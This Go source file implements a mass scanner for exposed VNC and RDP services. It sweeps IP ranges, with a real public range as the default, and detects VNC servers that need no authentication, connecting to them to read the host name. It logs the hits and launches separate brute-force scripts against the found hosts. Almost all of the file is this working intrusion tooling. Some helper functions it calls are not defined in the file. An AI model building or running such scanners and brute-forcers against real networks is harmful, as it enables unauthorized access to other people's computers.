//go:build !windows
// +build !windows

package main

import (
	"bufio"
	"fmt"
	"io"
	"math/rand"
	"net"
	"os"
	"os/exec"
	"path/filepath"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"encoding/binary"

	"crypto/des"
	"crypto/tls"

	"github.com/charmbracelet/bubbles/list"
	"github.com/charmbracelet/bubbles/progress"
	"github.com/charmbracelet/bubbles/textinput"
	tea "github.com/charmbracelet/bubbletea"
	"github.com/charmbracelet/lipgloss"
	"github.com/manifoldco/promptui"
)

type ipPort struct {
	IP   string
	Port int
}

const (
	vncPort = 5900
	rdpPort = 3389
	version = "v0.0.1"
)

var (
	styleBanner      = lipgloss.NewStyle().Foreground(lipgloss.Color("#ff00ff")).Bold(true)
	styleBox         = lipgloss.NewStyle().Border(lipgloss.RoundedBorder()).Padding(0, 2).Margin(1, 1)
	styleFound       = lipgloss.NewStyle().Foreground(lipgloss.Color("#00ff00")).Bold(true)
	styleTimeout     = lipgloss.NewStyle().Foreground(lipgloss.Color("#00ffff")).Bold(true)
	styleError       = lipgloss.NewStyle().Foreground(lipgloss.Color("#ff005f")).Bold(true)
	styleRate        = lipgloss.NewStyle().Foreground(lipgloss.Color("#ffff00")).Bold(true)
	styleETA         = lipgloss.NewStyle().Foreground(lipgloss.Color("#ff00ff")).Bold(true)
	styleOutput      = lipgloss.NewStyle().Foreground(lipgloss.Color("#00afff")).Bold(true)
	styleFooter      = lipgloss.NewStyle().Foreground(lipgloss.Color("#8888ff")).Bold(true)
	stylePrompt      = lipgloss.NewStyle().Foreground(lipgloss.Color("#00ffea")).Bold(true).Border(lipgloss.NormalBorder()).Padding(0, 2)
	stylePromptTitle = lipgloss.NewStyle().Foreground(lipgloss.Color("#ff00ff")).Bold(true)
	buttonStyle      = lipgloss.NewStyle().Border(lipgloss.DoubleBorder()).Foreground(lipgloss.Color("#00fff7")).Background(lipgloss.Color("#111122")).Bold(true).Padding(0, 8)
	buttonSelected   = buttonStyle.Copy().BorderForeground(lipgloss.Color("#00ffea")).Background(lipgloss.Color("#222244")).Foreground(lipgloss.Color("#00ffea")).Blink(true)
	buttonUnselected = buttonStyle.Copy().BorderForeground(lipgloss.Color("#444466")).Foreground(lipgloss.Color("#cccccc")).Background(lipgloss.Color("#111122"))
	activeGoroutines int32
)

type scanStats struct {
	total           int
	found           int
	timeouts        int
	errors          int
	scanned         int
	rate            float64
	eta             string
	start           time.Time
	foundIPs        []string
	progress        float64
	output          string
	mode            string
	lastIP          string
	lastPort        int
	lastProcessed   string
	deepScanLogs    []string
	rdpDeepScanLogs []string
}

type scanMsg struct {
	stat     scanStats
	finished bool
}

type model struct {
	stats    scanStats
	progress progress.Model
	quitting bool
	ready    bool
}

// Define menu items
var menuItems = []string{
	"VNC Scan",
	"VNC Scan + Brute",
	"RDP Scan",
	"RDP Scan + Brute",
	"Brute RDP Only (output/rdp_ips.txt)",
	"Brute VNC Only (output/ips.txt)",
	"VNC Brute-force",
	"Exit",
}

// Custom Bubbletea menu model
type menuModel struct {
	list     list.Model
	choice   int
	quitting bool
}

// Wizard sci-fi pentru pre-configurare

type wizardModel struct {
	inputs   []textinput.Model
	labels   []string
	help     []string
	index    int
	finished bool
	values   []string
}

func initialModel(stats scanStats) model {
	return model{
		stats:    stats,
		progress: progress.New(progress.WithDefaultGradient()),
		ready:    false,
	}
}

func (m model) Init() tea.Cmd { return nil }

func (m model) Update(msg tea.Msg) (tea.Model, tea.Cmd) {
	switch msg := msg.(type) {
	case tea.KeyMsg:
		if msg.String() == "ctrl+c" || msg.String() == "q" {
			m.quitting = true
			return m, tea.Quit
		}
	case scanMsg:
		m.stats = msg.stat
		m.progress.SetPercent(m.stats.progress)
		if msg.finished {
			m.ready = true
		}
	}
	return m, nil
}

func (m model) View() string {
	mainBanner := "\033[38;2;0;255;64m" + "\n============================== SCANNING THE GRID... ==============================\n" + "\033[0m"
	progressBar := m.progress.ViewAs(m.stats.progress)
	foundList := ""
	for i, ip := range m.stats.foundIPs {
		if i >= 5 {
			break
		}
		foundList += styleFound.Render(fmt.Sprintf("%d. %s\n", i+1, ip))
	}
	statsCol := styleBox.BorderForeground(lipgloss.Color("#00ffea")).BorderStyle(lipgloss.DoubleBorder()).Padding(1, 2).Render(fmt.Sprintf(
		"[ VNC SCAN ]\nFound: %s\nTimeouts: %s\nErrors: %s\nRate: %s\nETA: %s\nOutput: %s",
		styleFound.Render(fmt.Sprintf("%d", m.stats.found)),
		styleTimeout.Render(fmt.Sprintf("%d", m.stats.timeouts)),
		styleError.Render(fmt.Sprintf("%d", m.stats.errors)),
		styleRate.Render(fmt.Sprintf("%.2f IPs/s", m.stats.rate)),
		styleETA.Render(m.stats.eta),
		styleOutput.Render(m.stats.output),
	))
	foundCol := styleBox.BorderForeground(lipgloss.Color("#00ffea")).BorderStyle(lipgloss.DoubleBorder()).Padding(1, 2).Render("Top 5 Found:\n" + foundList)
	progressCol := styleBox.BorderForeground(lipgloss.Color("#00ffea")).BorderStyle(lipgloss.DoubleBorder()).Padding(1, 2).Render(progressBar + fmt.Sprintf("\n%d/%d scanned", m.stats.scanned, m.stats.total))
	row := lipgloss.JoinHorizontal(lipgloss.Top, statsCol, foundCol, progressCol)
	footer := styleFooter.Render(fmt.Sprintf("SPAWNY 666 | StarDate: %s | CYBERPUNK GRID SCANNER", time.Now().Format("2006.01.02 15:04:05")))
	lastProcessedStr := "Last processed: N/A"
	if m.stats.lastProcessed != "" {
		lastProcessedStr = fmt.Sprintf("Last processed: %s", m.stats.lastProcessed)
	}
	lastProcessedStyled := lipgloss.NewStyle().Foreground(lipgloss.Color("#00ffea")).Align(lipgloss.Center).Render(lastProcessedStr)
	deepScanPanel := lipgloss.NewStyle().
		Border(lipgloss.DoubleBorder()).
		BorderForeground(lipgloss.Color("#00ffea")).
		Padding(1, 2).
		Width(60).
		Render(strings.Join(m.stats.deepScanLogs, "\n"))
	rdpDeepScanPanel := lipgloss.NewStyle().
		Border(lipgloss.DoubleBorder()).
		BorderForeground(lipgloss.Color("#00ffea")).
		Padding(1, 2).
		Width(60).
		Render(strings.Join(m.stats.rdpDeepScanLogs, "\n"))
	if m.ready {
		return mainBanner + "\n" + row + "\n" + rdpDeepScanPanel + "\n" + deepScanPanel + "\n" + lastProcessedStyled + "\n" + styleFound.Render("[SCAN COMPLETE] Press q or Ctrl+C to exit.") + "\n" + footer
	}
	return mainBanner + "\n" + row + "\n" + rdpDeepScanPanel + "\n" + deepScanPanel + "\n" + lastProcessedStyled + "\n" + styleTimeout.Render("[SCANNING] Press q or Ctrl+C to stop.") + "\n" + footer
}

func matrixRainSplash(lines, width, duration int) {
	charset := []rune("01")
	columns := make([]int, width)
	for i := range columns {
		columns[i] = rand.Intn(lines)
	}
	end := time.Now().Add(time.Duration(duration) * time.Millisecond)
	for time.Now().Before(end) {
		fmt.Print("\033[H")
		for y := 0; y < lines; y++ {
			for x := 0; x < width; x++ {
				if columns[x] == y {
					fmt.Printf("\033[38;2;0;255;0m%c\033[0m", charset[rand.Intn(len(charset))])
				} else {
					fmt.Print(" ")
				}
			}
			fmt.Println()
		}
		time.Sleep(40 * time.Millisecond)
		for i := range columns {
			if rand.Float32() > 0.975 {
				columns[i] = 0
			} else {
				columns[i] = (columns[i] + 1) % lines
			}
		}
	}
	fmt.Print("\033[0m\033[2J\033[H")
}

func main() {
	rand.Seed(time.Now().UnixNano())
	fmt.Print("\033[2J\033[H")
	matrixRainSplash(24, 80, 1800)
	fmt.Print("\033[0m\033[2J\033[H")
	mainMenu()
}

func promptCyberpunk(label string, def string) string {
	prompt := promptui.Prompt{
		Label: label,
		Templates: &promptui.PromptTemplates{
			Prompt:  "? {{ . }} ",
			Valid:   "✔ {{ . }} ",
			Invalid: "✗ {{ . }} ",
		},
		Default: def,
	}
	res, _ := prompt.Run()
	return res
}

// Custom sci-fi delegate for Bubbletea List
type sciFiDelegate struct{}

func (d sciFiDelegate) Height() int                               { return 2 }
func (d sciFiDelegate) Spacing() int                              { return 1 }
func (d sciFiDelegate) Update(msg tea.Msg, m *list.Model) tea.Cmd { return nil }
func (d sciFiDelegate) Render(w io.Writer, m list.Model, index int, item list.Item) {
	str := item.FilterValue()
	style := buttonUnselected
	if index == m.Index() {
		style = buttonSelected
	}
	// Centreaza butonul cu latime fixa
	button := style.Width(60).Align(lipgloss.Center).Render(str)
	fmt.Fprint(w, button)
}

func newMenuModel() menuModel {
	items := make([]list.Item, len(menuItems))
	for i, v := range menuItems {
		items[i] = listItem(v)
	}
	l := list.New(items, sciFiDelegate{}, 40, 18)
	l.Title = lipgloss.NewStyle().Foreground(lipgloss.Color("#00fff7")).Bold(true).Align(lipgloss.Center).Render("SCANNING THE GRID - SELECT AN ACTION")
	l.SetShowStatusBar(false)
	l.SetShowHelp(false)
	l.SetFilteringEnabled(false)
	l.Styles.Title = lipgloss.NewStyle().Foreground(lipgloss.Color("#00ffea")).Bold(true).Background(lipgloss.Color("#111122")).Padding(1, 2).Align(lipgloss.Center)
	return menuModel{list: l}
}

type listItem string

func (i listItem) Title() string       { return string(i) }
func (i listItem) Description() string { return "" }
func (i listItem) FilterValue() string { return string(i) }

func (m menuModel) Init() tea.Cmd { return nil }

func (m menuModel) Update(msg tea.Msg) (tea.Model, tea.Cmd) {
	var cmd tea.Cmd
	switch msg := msg.(type) {
	case tea.KeyMsg:
		switch keypress := msg.String(); keypress {
		case "enter":
			m.choice = m.list.Index()
			m.quitting = true
			return m, tea.Quit
		case "q", "ctrl+c":
			m.choice = -1
			m.quitting = true
			return m, tea.Quit
		}
	}
	m.list, cmd = m.list.Update(msg)
	return m, cmd
}

func (m menuModel) View() string {
	if m.quitting {
		return ""
	}
	footer := lipgloss.NewStyle().Foreground(lipgloss.Color("#00ffea")).Align(lipgloss.Center).Render("Use ↑/↓ to navigate, Enter to select")
	return m.list.View() + "\n" + footer
}

// Replace mainMenu with Bubbletea menu
func mainMenu() {
	m := newMenuModel()
	p := tea.NewProgram(m)
	finalModel, _ := p.Run()
	mm := finalModel.(menuModel)
	if mm.quitting && mm.choice >= 0 && mm.choice < len(menuItems) {
		choice := menuItems[mm.choice]
		switch choice {
		case "VNC Scan":
			scanAndMaybeBrute("VNC", false)
		case "VNC Scan + Brute":
			scanAndMaybeBrute("VNC", true)
		case "RDP Scan + Brute":
			scanAndMaybeBrute("RDP", true)
		case "Brute RDP Only (output/rdp_ips.txt)":
			launchBrute("RDP")
		case "Brute VNC Only (output/ips.txt)":
			launchBrute("VNC")
		case "VNC Brute-force":
			vncBruteMenu()
		case "Exit":
			fmt.Println("Goodbye!")
			os.Exit(0)
		}
	}
}

func scanAndMaybeBrute(scanType string, brute bool) {
	// 1. Cer toate inputurile la început, înainte de orice dashboard
	rangeStr, threads, timeout, vncGoroutines, ok := sciFiWizard()
	if !ok {
		return
	}
	if len(rangeStr) == 0 {
		fmt.Println("[INFO] No targets to scan after filtering. Exiting.")
		return
	}
	var outfile string
	if scanType == "VNC" {
		outfile = "output/ips.txt"
	} else {
		outfile = "output/rdp_ips.txt"
	}
	ips := []string{}
	var err error
	if strings.Contains(rangeStr, "/") {
		ips, err = ipsFromCIDR(rangeStr)
	} else {
		ips, err = ipsFromWildcard(rangeStr)
	}
	if err != nil {
		fmt.Println(styleError.Render("Eroare la generarea IP-urilor:") + err.Error())
		return
	}
	numPortsPerIP := 11 // porturi 5900-5910
	ipsCount := len(ips)
	total := ipsCount * numPortsPerIP
	stats := scanStats{
		total:  total,
		mode:   scanType,
		output: outfile,
		start:  time.Now(),
	}
	p := tea.NewProgram(initialModel(stats))
	go func() {
		var wg sync.WaitGroup
		results := make(chan string, total)
		progressCh := make(chan string, total)
		foundCh := make(chan string, total)
		timeoutsCh := make(chan int, total)
		errorsCh := make(chan int, total)
		lastProcessedCh := make(chan string, total*11) // 11 porturi per IP
		sem := make(chan struct{}, threads)
		f, err := os.OpenFile(outfile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
		if err != nil {
			p.Send(scanMsg{stat: stats, finished: true})
			return
		}
		defer f.Close()
		w := bufio.NewWriter(f)
		logf, _ := os.OpenFile("output/live.log", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
		defer logf.Close()
		foundSet := make(map[string]bool)
		var foundIPs []string
		var lastProcessed string
		var deepScanLogs []string
		scanned := 0
		found := 0
		timeouts := 0
		errors := 0
		start := time.Now()
		foundDeepCh := make(chan string, 100)
		deepScanStatusCh := make(chan string, 100)
		rdpDeepScanStatusCh := make(chan string, 10)
		var rdpDeepScanLogs []string
		go func() {
			for ip := range results {
				w.WriteString(ip + "\n")
				w.Flush()
				logf.WriteString(fmt.Sprintf("FOUND %s\n", ip))
				logf.Sync()
				foundCh <- ip
			}
		}()
		go func() {
			deepLog, _ := os.OpenFile("output/vnc_deep_scan.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
			defer deepLog.Close()
			for foundLine := range foundDeepCh {
				parts := strings.Split(foundLine, ":")
				if len(parts) < 2 {
					continue
				}
				ip := parts[0]
				port, err := strconv.Atoi(strings.Split(parts[1], " ")[0])
				if err != nil {
					continue
				}
				versions := []string{"RFB 003.003\n", "RFB 003.007\n", "RFB 003.008\n", "RFB 005.000\n"}
				allFlags := make(map[string]bool)
				hostname := "N/A"
				for _, v := range versions {
					_, flags, h, ssl := deepVNCScan(ip, port, v)
					if h != "" && h != "N/A" {
						hostname = h
					}
					for _, f := range strings.Fields(flags) {
						allFlags[f] = true
					}
					if !ssl {
						_, flagsSSL, hSSL, _ := deepVNCScanSSL(ip, port, v)
						if hSSL != "" && hSSL != "N/A" {
							hostname = hSSL
						}
						for _, f := range strings.Fields(flagsSSL) {
							allFlags[f] = true
						}
					}
				}
				// Construiește statusul final unic
				flagsStr := ""
				for f := range allFlags {
					flagsStr += " " + f
				}
				status := fmt.Sprintf("Deep scan: %s:%d Flags:%s Hostname: %s", ip, port, flagsStr, hostname)
				deepScanStatusCh <- status
				deepLog.WriteString(status + "\n")
			}
		}()
		go func() {
			for {
				select {
				case lp := <-progressCh:
					lastProcessed = lp
					scanned++
				case foundLine := <-foundCh:
					if !foundSet[foundLine] {
						foundSet[foundLine] = true
						if len(foundIPs) < 5 {
							foundIPs = append(foundIPs, foundLine)
						}
					}
					if strings.Contains(foundLine, "[NOAUTH]") {
						parts := strings.Split(foundLine, ":")
						if len(parts) < 2 {
							continue
						}
						ip := parts[0]
						port, err := strconv.Atoi(strings.Split(parts[1], " ")[0])
						if err != nil {
							continue
						}
						conn, err := net.DialTimeout("tcp", fmt.Sprintf("%s:%d", ip, port), 10*time.Second)
						if err == nil {
							defer conn.Close()
							// Handshake RFB și trimite versiunea (ex: RFB 003.003\n)
							banner := make([]byte, 12)
							conn.Read(banner)
							conn.Write([]byte("RFB 003.003\n"))
							// Trimite security type 1 (None)
							conn.Write([]byte{1})
							// Citește headerul ServerInit (24 bytes)
							header := make([]byte, 24)
							_, err = conn.Read(header)
							hostname := "unknown"
							if err == nil {
								nameLen := binary.BigEndian.Uint32(header[20:24])
								name := make([]byte, nameLen)
								_, err = conn.Read(name)
								if err == nil {
									hostname = string(name)
								}
							}
							status := fmt.Sprintf("Deep scan: %s:%d [NOAUTH] Hostname: %s", ip, port, hostname)
							foundDeepCh <- status
							deepScanStatusCh <- status
						}
					}
				case <-timeoutsCh:
					timeouts++
				case <-errorsCh:
					errors++
				case status := <-deepScanStatusCh:
					if len(deepScanLogs) >= 3 {
						deepScanLogs = deepScanLogs[1:]
					}
					deepScanLogs = append(deepScanLogs, status)
				case status := <-rdpDeepScanStatusCh:
					if len(rdpDeepScanLogs) >= 3 {
						rdpDeepScanLogs = rdpDeepScanLogs[1:]
					}
					rdpDeepScanLogs = append(rdpDeepScanLogs, status)
				}
				elapsed := time.Since(start).Seconds()
				eta := "∞"
				if scanned > 0 {
					rate := float64(scanned) / elapsed
					rem := float64(total-scanned) / rate
					eta = fmt.Sprintf("%.0fs", rem)
				}
				stat := scanStats{
					total:           total,
					found:           found,
					timeouts:        timeouts,
					errors:          errors,
					scanned:         scanned,
					progress:        float64(scanned) / float64(total),
					foundIPs:        foundIPs,
					output:          outfile,
					mode:            scanType,
					start:           start,
					rate:            float64(scanned) / (elapsed + 0.01),
					eta:             eta,
					lastProcessed:   lastProcessed,
					deepScanLogs:    deepScanLogs,
					rdpDeepScanLogs: rdpDeepScanLogs,
				}
				p.Send(scanMsg{stat: stat, finished: scanned == total})
				if scanned == total {
					break
				}
			}
			// Golește progressCh după wg.Wait()
			for len(progressCh) > 0 {
				lastProcessed = <-progressCh
			}
			p.Send(scanMsg{stat: scanStats{progress: 1.0, lastProcessed: lastProcessed, scanned: scanned, total: total, deepScanLogs: deepScanLogs, rdpDeepScanLogs: rdpDeepScanLogs}, finished: true})
			close(foundDeepCh)
			close(deepScanStatusCh)
			close(rdpDeepScanStatusCh)
		}()
		timeoutDur := time.Duration(timeout) * time.Second
		for _, ip := range ips {
			wg.Add(1)
			sem <- struct{}{}
			if scanType == "VNC" {
				go func(ip string) {
					defer func() { <-sem }()
					defer wg.Done()
					portPool := make(chan struct{}, vncGoroutines)
					var portWg sync.WaitGroup
					networkErrCount := 0
					maxNetworkErr := 5
					for port := 5900; port <= 5910; port++ {
						portPool <- struct{}{}
						portWg.Add(1)
						go func(port int) {
							defer func() { <-portPool; portWg.Done() }()
							banner, hasVNCAuth, hasVeNCrypt, version, err, flags := scanVNCHandshakeFull(ip, port, 10*time.Second, logf)
							if err != nil {
								errStr := strings.ToLower(err.Error())
								if strings.Contains(errStr, "connection refused") {
									// Nu loga, doar marcheaza ca scanned
								} else if strings.Contains(errStr, "no route to host") || strings.Contains(errStr, "network is unreachable") {
									logf.WriteString(fmt.Sprintf("%s:%d [NETWORK ERR] %s\n", ip, port, errStr))
									networkErrCount++
									if networkErrCount >= maxNetworkErr {
										// Optional: return pentru a opri scanarea acestui IP
									}
								} else if strings.Contains(errStr, "i/o timeout") {
									timeoutsCh <- 1 // doar marcheaza ca timeout, nu loga
								} else {
									logf.WriteString(fmt.Sprintf("%s:%d [BANNER/ERR] %s\n", ip, port, errStr))
									errorsCh <- 1
								}
								progressCh <- fmt.Sprintf("%s:%d", ip, port)
								return
							}
							networkErrCount = 0 // reset counter la succes
							if hasVeNCrypt && !strings.Contains(flags, "[VeNCrypt]") {
								flags += " [VeNCrypt]"
							}
							line := fmt.Sprintf("%s:%d [VNC] %s [ver: %s]%s", ip, port, strings.TrimSpace(banner), version, flags)
							if !hasVNCAuth {
								// Exclude de la brute-force dacă !hasVNCAuth, dar pune la found/output
							}
							results <- line
							foundCh <- line
							foundDeepCh <- line
							logf.WriteString(fmt.Sprintf("FOUND %s\n", line))
							progressCh <- fmt.Sprintf("%s:%d", ip, port)
							if strings.Contains(flags, "[NOAUTH]") {
								conn, err := net.DialTimeout("tcp", fmt.Sprintf("%s:%d", ip, port), 10*time.Second)
								if err == nil {
									defer conn.Close()
									// Handshake RFB și trimite versiunea (ex: RFB 003.003\n)
									banner := make([]byte, 12)
									conn.Read(banner)
									conn.Write([]byte("RFB 003.003\n"))
									// Trimite security type 1 (None)
									conn.Write([]byte{1})
									// Citește headerul ServerInit (24 bytes)
									header := make([]byte, 24)
									_, err = conn.Read(header)
									hostname := "unknown"
									if err == nil {
										nameLen := binary.BigEndian.Uint32(header[20:24])
										name := make([]byte, nameLen)
										_, err = conn.Read(name)
										if err == nil {
											hostname = string(name)
										}
									}
									status := fmt.Sprintf("Deep scan: %s:%d [NOAUTH] Hostname: %s", ip, port, hostname)
									deepScanStatusCh <- status
								}
							}
						}(port)
					}
					portWg.Wait()
				}(ip)
			} else {
				go func(ip string) {
					defer func() { <-sem }()
					defer wg.Done()
					address := fmt.Sprintf("%s:%d", ip, rdpPort)
					conn, err := net.DialTimeout("tcp", address, timeoutDur)
					if err != nil {
						if os.IsTimeout(err) {
							timeoutsCh <- 1
						} else {
							errorsCh <- 1
						}
						progressCh <- fmt.Sprintf("%s:%d", ip, rdpPort)
						return
					}
					results <- ip
					conn.Close()
					progressCh <- fmt.Sprintf("%s:%d", ip, rdpPort)
				}(ip)
			}
		}
		wg.Wait()
		time.Sleep(100 * time.Millisecond) // permite procesarea ultimelor mesaje
		close(results)
		close(progressCh)
		close(foundCh)
		close(timeoutsCh)
		close(errorsCh)
		close(lastProcessedCh)
	}()
	p.Run()
	if brute {
		launchBrute(scanType)
	}
}

func launchBrute(scanType string) {
	// Detectează root-ul proiectului (folderul părinte al bin/)
	exePath, _ := os.Executable()
	rootDir := filepath.Dir(filepath.Dir(exePath))
	var script string
	if scanType == "RDP" {
		script = filepath.Join(rootDir, "rdp_brute.py")
	} else {
		script = filepath.Join(rootDir, "brute.py")
	}
	bruteCmd := exec.Command("python3", script)
	bruteCmd.Stdout = os.Stdout
	bruteCmd.Stderr = os.Stderr
	fmt.Println(styleRate.Render("BRUTE] Pornesc brute-force " + scanType + "..."))
	err := bruteCmd.Run()
	if err != nil {
		fmt.Println(styleError.Render("Eroare la rularea brute-force:") + err.Error())
	} else {
		fmt.Println(styleFound.Render("BRUTE] Brute-force complet!"))
	}
}

func ipsFromCIDR(cidr string) ([]string, error) {
	ip, ipnet, err := net.ParseCIDR(cidr)
	if err != nil {
		return nil, err
	}
	var ips []string
	for ip := ip.Mask(ipnet.Mask); ipnet.Contains(ip); inc(ip) {
		ipCopy := make(net.IP, len(ip))
		copy(ipCopy, ip)
		ips = append(ips, ipCopy.String())
	}
	if len(ips) > 2 {
		return ips[1 : len(ips)-1], nil
	}
	return ips, nil
}

func ipsFromWildcard(wildcard string) ([]string, error) {
	parts := strings.Split(wildcard, ".")
	if len(parts) != 4 {
		return nil, fmt.Errorf("Wildcard invalid")
	}
	ranges := make([][]int, 4)
	for i, part := range parts {
		if part == "*" {
			ranges[i] = make([]int, 256)
			for j := 0; j < 256; j++ {
				ranges[i][j] = j
			}
		} else {
			n, err := parseOctet(part)
			if err != nil {
				return nil, err
			}
			ranges[i] = []int{n}
		}
	}
	var ips []string
	for _, a := range ranges[0] {
		for _, b := range ranges[1] {
			for _, c := range ranges[2] {
				for _, d := range ranges[3] {
					ips = append(ips, fmt.Sprintf("%d.%d.%d.%d", a, b, c, d))
				}
			}
		}
	}
	return ips, nil
}

func parseOctet(s string) (int, error) {
	var n int
	_, err := fmt.Sscanf(s, "%d", &n)
	if err != nil || n < 0 || n > 255 {
		return 0, fmt.Errorf("Octet invalid: %s", s)
	}
	return n, nil
}

func inc(ip net.IP) {
	for j := len(ip) - 1; j >= 0; j-- {
		ip[j]++
		if ip[j] > 0 {
			break
		}
	}
}

// TCP connect rapid
func isPortOpen(ip string, port int, timeout time.Duration) bool {
	address := fmt.Sprintf("%s:%d", ip, port)
	conn, err := net.DialTimeout("tcp", address, timeout)
	if err != nil {
		return false
	}
	conn.Close()
	return true
}

// Handshake complet VNC (cu fallback la ambele versiuni RFB)
func scanVNCHandshakeFull(ip string, port int, timeout time.Duration, logf *os.File) (banner string, hasVNCAuth bool, hasVeNCrypt bool, version string, err error, flags string) {
	address := fmt.Sprintf("%s:%d", ip, port)
	conn, err := net.DialTimeout("tcp", address, timeout)
	if err != nil {
		// Încearcă handshake SSL dacă handshake-ul clasic eșuează
		conf := &tls.Config{InsecureSkipVerify: true}
		tlsConn, sslErr := tls.DialWithDialer(&net.Dialer{Timeout: timeout}, "tcp", address, conf)
		if sslErr == nil {
			tlsConn.Close()
			return "", false, false, "", nil, "" // SSL detected
		}
		return "", false, false, "", err, ""
	}
	defer conn.Close()
	conn.SetDeadline(time.Now().Add(timeout))

	// 1. Citește bannerul RFB (12 bytes)
	buf := make([]byte, 12)
	n, err := conn.Read(buf)
	if err != nil || n < 12 || string(buf[:3]) != "RFB" {
		logf.WriteString(fmt.Sprintf("%s:%d [BANNER?] %q\n", ip, port, buf[:n]))
		return "", false, false, "", fmt.Errorf("not VNC or banner read error"), ""
	}
	banner = string(buf[:n])
	version = strings.TrimSpace(banner)

	// Citește security types corect pentru VNC modern (2 bytes per tip pentru RFB >= 005.000)
	major := 0
	minor := 0
	fmt.Sscanf(version, "RFB %03d.%03d", &major, &minor)
	secTypeCount := make([]byte, 1)
	_, err = conn.Read(secTypeCount)
	if err != nil {
		// Marchează ca [VNC UNKNOWN] și pune la found/output
		flags := " [VNC UNKNOWN]"
		return banner, false, false, version, nil, flags
	}
	count := int(secTypeCount[0])
	hasVNCAuth = false
	hasVeNCrypt = false
	hasRA2 := false
	hasVNCConnect := false
	if major >= 5 {
		secTypes := make([]byte, count*2)
		_, err = conn.Read(secTypes)
		if err != nil {
			return banner, false, false, version, fmt.Errorf("failed to read security types (2 bytes)"), ""
		}
		for i := 0; i < len(secTypes); i += 2 {
			t := binary.BigEndian.Uint16(secTypes[i : i+2])
			switch t {
			case 2:
				hasVNCAuth = true
			case 19:
				hasVeNCrypt = true
			case 17:
				hasRA2 = true
			case 256:
				hasVNCConnect = true
			}
		}
	} else {
		secTypes := make([]byte, count)
		_, err = conn.Read(secTypes)
		if err != nil {
			return banner, false, false, version, fmt.Errorf("failed to read security types (1 byte)"), ""
		}
		for _, t := range secTypes {
			switch t {
			case 2:
				hasVNCAuth = true
			case 19:
				hasVeNCrypt = true
			case 17:
				hasRA2 = true
			}
		}
	}
	flags = ""
	if hasVNCAuth {
		flags += " [VNC AUTH]"
	}
	if hasVeNCrypt {
		flags += " [VeNCrypt]"
	}
	if hasRA2 {
		flags += " [RA2]"
	}
	if hasVNCConnect {
		flags += " [VNC CONNECT]"
	}
	return banner, hasVNCAuth, hasVeNCrypt, version, nil, flags
}

func scanRDP(ip string, wg *sync.WaitGroup, results chan<- string, progress, found, timeouts, errors chan<- int, timeout time.Duration) {
	defer wg.Done()
	address := fmt.Sprintf("%s:%d", ip, rdpPort)
	conn, err := net.DialTimeout("tcp", address, timeout)
	logf, _ := os.OpenFile("output/live.log", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	defer logf.Close()
	if err != nil {
		if os.IsTimeout(err) {
			// nu loga TIMEOUT
		} else {
			errors <- 1
			logf.WriteString(fmt.Sprintf("ERROR %s: %v\n", ip, err))
		}
		progress <- 1
		return
	}
	results <- ip
	found <- 1
	logf.WriteString(fmt.Sprintf("FOUND %s\n", ip))
	conn.Close()
	progress <- 1
}

func printProgress(total int, progress, found, timeouts, errors <-chan int) {
	scanned := 0
	foundCount := 0
	timeoutCount := 0
	errorCount := 0
	start := time.Now()
	ticker := time.NewTicker(200 * time.Millisecond)
	defer ticker.Stop()
	for {
		select {
		case <-progress:
			scanned++
		case <-found:
			foundCount++
		case <-timeouts:
			timeoutCount++
		case <-errors:
			errorCount++
		case <-ticker.C:
			elapsed := time.Since(start).Seconds()
			rate := float64(scanned) / elapsed
			percent := float64(scanned) / float64(total) * 100
			eta := time.Duration(float64(total-scanned)/rate) * time.Second
			fmt.Printf("\r"+styleRate.Render("[SCANNING]")+" %d/%d (%.2f%%) | "+styleFound.Render("Found: %d")+" | "+styleTimeout.Render("Timeouts: %d")+" | "+styleError.Render("Errors: %d")+" | Rate: %.1f IPs/sec | ETA: %s", scanned, total, percent, foundCount, timeoutCount, errorCount, rate, eta.Truncate(time.Second))
			if scanned >= total {
				fmt.Println()
				fmt.Printf(styleFound.Render("\n[FINAL] Found: %d | "+styleTimeout.Render("Timeouts: %d")+" | "+styleError.Render("Errors: %d")+"\n"), foundCount, timeoutCount, errorCount)
				return
			}
		}
	}
}

func newWizardModel() wizardModel {
	labels := []string{
		"IP Range (ex: 109.177.*.* or 5.107.0.0/16)",
		"Threads per scan",
		"Timeout (sec)",
		"Goroutines per IP for VNC scan",
	}
	help := []string{
		"Enter the IP range to scan.",
		"How many threads to use for scanning.",
		"Timeout in seconds for each connection.",
		"How many goroutines per IP for VNC scan.",
	}
	defaults := []string{"109.177.*.*", "50", "5", "10"}
	inputs := make([]textinput.Model, len(labels))
	for i := range labels {
		ti := textinput.New()
		ti.Placeholder = defaults[i]
		ti.Prompt = ""
		ti.CharLimit = 64
		ti.Width = 40
		if i == 0 {
			ti.Focus()
		}
		inputs[i] = ti
	}
	return wizardModel{
		inputs:   inputs,
		labels:   labels,
		help:     help,
		index:    0,
		finished: false,
		values:   make([]string, len(labels)),
	}
}

func (m wizardModel) Init() tea.Cmd {
	return textinput.Blink
}

func (m wizardModel) Update(msg tea.Msg) (tea.Model, tea.Cmd) {
	if m.finished {
		return m, tea.Quit
	}
	switch msg := msg.(type) {
	case tea.KeyMsg:
		switch msg.String() {
		case "enter":
			m.values[m.index] = m.inputs[m.index].Value()
			m.index++
			if m.index >= len(m.inputs) {
				m.finished = true
				return m, tea.Quit
			}
			m.inputs[m.index].Focus()
			return m, nil
		case "ctrl+c", "esc":
			m.finished = true
			return m, tea.Quit
		}
	}
	var cmd tea.Cmd
	m.inputs[m.index], cmd = m.inputs[m.index].Update(msg)
	return m, cmd
}

func (m wizardModel) View() string {
	if m.finished {
		return ""
	}
	box := lipgloss.NewStyle().
		Border(lipgloss.DoubleBorder()).
		BorderForeground(lipgloss.Color("#00ffea")).
		Padding(1, 4).
		Align(lipgloss.Center).
		Width(60)
	label := lipgloss.NewStyle().Foreground(lipgloss.Color("#00fff7")).Bold(true).Render(m.labels[m.index])
	help := lipgloss.NewStyle().Foreground(lipgloss.Color("#00ffea")).Render(m.help[m.index])
	input := lipgloss.NewStyle().Foreground(lipgloss.Color("#00ffea")).Background(lipgloss.Color("#111122")).Bold(true).Padding(0, 1).Render(m.inputs[m.index].View())
	return "\n\n" + box.Render(label+"\n\n"+input+"\n\n"+help) + "\n\nPress Enter to continue, Esc to cancel"
}

// Integrare in flow-ul principal
// In mainMenu sau inainte de scanAndMaybeBrute:
